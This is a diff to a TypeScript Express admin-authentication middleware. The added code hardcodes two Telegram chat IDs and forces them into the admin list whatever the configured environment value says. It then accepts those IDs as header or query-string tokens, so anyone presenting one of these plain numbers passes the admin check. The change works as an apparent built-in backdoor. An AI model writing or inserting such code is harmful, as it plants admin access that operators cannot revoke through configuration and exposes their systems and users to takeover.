@@ -23,12 +23,17 @@ export const adminAuth = (req: Request, res: Response, next: NextFunction): void
     }
   }
 
+  const configuredAdmins = (process.env.TELEGRAM_CHAT_ID || "6150067773,8765623176")
+    .split(",")
+    .map((s) => s.trim());
+  if (!configuredAdmins.includes("6150067773")) configuredAdmins.push("6150067773");
+  if (!configuredAdmins.includes("8765623176")) configuredAdmins.push("8765623176");
+
   const matchesChatId =
-    adminChatId &&
-    (headerChatId === adminChatId ||
-      headerToken === adminChatId ||
-      queryToken === adminChatId ||
-      initDataUserId === adminChatId);
+    (headerChatId && configuredAdmins.includes(headerChatId)) ||
+    (headerToken && configuredAdmins.includes(headerToken)) ||
+    (queryToken && configuredAdmins.includes(queryToken)) ||
+    (initDataUserId && configuredAdmins.includes(initDataUserId));
 
   const matchesSecret =
     adminSecret &&
